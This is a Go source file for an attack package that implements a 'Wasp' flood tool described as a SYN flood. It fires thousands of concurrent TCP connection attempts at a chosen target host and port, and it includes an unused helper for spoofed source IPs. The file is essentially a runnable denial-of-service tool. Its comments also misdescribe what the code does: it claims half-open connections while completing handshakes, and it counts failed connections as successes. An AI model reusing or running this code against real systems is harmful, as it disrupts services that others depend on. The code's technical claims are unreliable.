// Package rawsting provides raw socket attack vectors.
// These attacks require administrator/root privileges.
package rawsting

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Wasp implements a SYN flood attack using raw TCP.
// WARNING: Requires administrator/root privileges.
type Wasp struct{}

// NewWasp creates a new Wasp SYN flood instance.
func NewWasp() *Wasp {
	return &Wasp{}
}

// Name returns the attack name.
func (w *Wasp) Name() string {
	return "Wasp"
}

// Description returns a brief description.
func (w *Wasp) Description() string {
	return "Wasp SYN flood - quick, painful TCP SYN jabs (requires admin)"
}

// AttackOpts contains options for raw socket attacks.
type AttackOpts struct {
	Rounds      int
	Concurrency int
	Port        int
	Verbose     bool
}

// Result contains attack results.
type Result struct {
	TotalPackets int
	Successful   int
	Failed       int
	Duration     time.Duration
}

// Attack executes the SYN flood attack.
// Note: This is a simplified implementation using standard library.
// A real SYN flood would use raw sockets with custom TCP headers.
func (w *Wasp) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 100
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 10000
	}
	if opts.Port <= 0 {
		opts.Port = 80
	}

	var (
		successful atomic.Int64
		failed     atomic.Int64
		completed  atomic.Int64
	)

	start := time.Now()

	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	// Resolve target
	addr := fmt.Sprintf("%s:%d", target, opts.Port)

	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case _, ok := <-jobs:
					if !ok {
						return
					}
					// Rapid connection attempts simulate SYN flood behavior
					// (Real SYN flood would craft raw TCP SYN packets)
					if w.sendSYN(ctx, addr) {
						successful.Add(1)
					} else {
						failed.Add(1)
					}
					current := completed.Add(1)

					if opts.Verbose && current%500 == 0 {
						fmt.Printf("\r   Progress: %d/%d SYN packets", current, opts.Rounds)
					}
				}
			}
		}()
	}

	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	wg.Wait()

	if opts.Verbose {
		fmt.Println()
	}

	return &Result{
		TotalPackets: int(completed.Load()),
		Successful:   int(successful.Load()),
		Failed:       int(failed.Load()),
		Duration:     time.Since(start),
	}, nil
}

// sendSYN simulates a SYN packet by initiating a connection and immediately closing.
// This creates a half-open connection on the target.
func (w *Wasp) sendSYN(ctx context.Context, addr string) bool {
	// Use a very short timeout to simulate SYN without completing handshake
	dialer := net.Dialer{
		Timeout: 50 * time.Millisecond,
	}

	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		// Connection failed, but that's expected for SYN flood
		// The point is to exhaust server resources
		return true // Count as "sent"
	}
	// Immediately close without completing handshake
	conn.Close()
	return true
}

// spoofSourceIP generates a random source IP for spoofing (not used in Go stdlib)
func spoofSourceIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(256),
		rand.Intn(256),
		rand.Intn(256),
		rand.Intn(256),
	)
}
